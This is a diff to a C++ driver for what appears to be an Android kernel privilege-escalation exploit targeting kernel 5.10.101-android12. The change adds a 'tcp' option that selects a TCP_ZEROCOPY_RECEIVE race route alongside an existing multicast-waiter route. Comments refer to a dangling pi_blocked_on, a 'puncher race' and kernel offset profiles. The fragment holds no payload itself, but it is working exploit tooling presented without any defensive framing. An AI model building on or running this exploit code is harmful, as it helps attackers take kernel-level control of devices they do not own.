@@ -46,14 +46,19 @@ int main(int argc, char **argv) {
      * correct alignment. */
     int waiter_off_override = -1;
     if (argc > 3 && std::strcmp(argv[2], "waiter_off") == 0) {
-        waiter_off_override = std::atoi(argv[3]);
+        waiter_off_override = std::stoi(argv[3]);
     }
     static const char kRelease[] = "5.10.101-android12-9-gece0cc04d1a5";
 
+    /* argv[2] == "tcp" -> the tcp_zerocopy route (getsockopt(TCP_ZEROCOPY_RECEIVE)
+     * parked frame + puncher race). Unlike multicast it does not depend on a
+     * dangling pi_blocked_on: the stamp is consumed inside its own live race. */
+    const bool tcp_recipe = argc > 2 && std::strcmp(argv[2], "tcp") == 0;
     profile::kernel_offsets p{};
     p.uname_r = kRelease;
     p.route = select_recipe ? profile::kRouteSelectStack
-                            : profile::kRouteMulticastWaiter;
+                  : tcp_recipe ? profile::kRouteTcpZerocopy
+                               : profile::kRouteMulticastWaiter;
 
     p.meta.kernel_major = 5;
     p.meta.recommend_shizuku = 0;
